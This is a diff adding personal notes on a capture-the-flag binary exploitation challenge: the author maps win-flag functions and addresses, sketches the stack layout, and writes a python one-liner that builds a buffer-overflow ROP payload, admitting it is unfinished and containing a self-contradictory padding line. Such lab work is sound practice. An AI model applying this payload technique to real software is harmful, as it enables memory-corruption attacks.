@@ -1,0 +1,39 @@
+32-bit binary.
+
+display_flag:
+	opens the flag.txt file and only displays it if global variables are set.
+	to set themm, should jump to functions that set those global variables.
+
+	1. leapA() - 0x080485e6 -> to set win1 global variable.
+	2. leap3() - 0x08048666 -> given that win1 set, sets win3 variable.
+	3. leap2() - 0x080485fd -> given that win3 set, and given argument 0xDEADBEEF, sets win2
+
+vuln:
+
+esp->
+^
+|
+-ebp-0x18
+|
+v
+ebp->	ebp
+		eip first_ret_jump
+			second_ret_jump
+			third_ret_jump
+			display_flag_jump
+			0xdeadbeef
+
+
+padding = 'A' * (0x18) == 'A' * (0x1c)
+ebp_padding = '\xe6\x85\x04\x08'
+first_ret_jump = '\xe6\x85\x04\x08'
+dummy_ebp = 'AAAA'
+second_ret_jump = '\x66\x86\x04\x08'
+third_ret_jump = '\xfd\x85\x04\x08'
+display_flag_jump = '\xb3\x86\x04\x08'
+argument = '\xef\xbe\xad\xde'
+
+python -c "print('A' * 0x18 + '\xe6\x85\x04\x08' + '\xe6\x85\x04\x08' + '\x66\x86\x04\x08' + '\xfd\x85\x04\x08' + '\xb3\x86\x04\x08' + '\xef\xbe\xad\xde')"
+
+Reached at some point in the flow of rop planning, but got stuck on finding a rop gadget that will set the stack for the flow of the code.
+
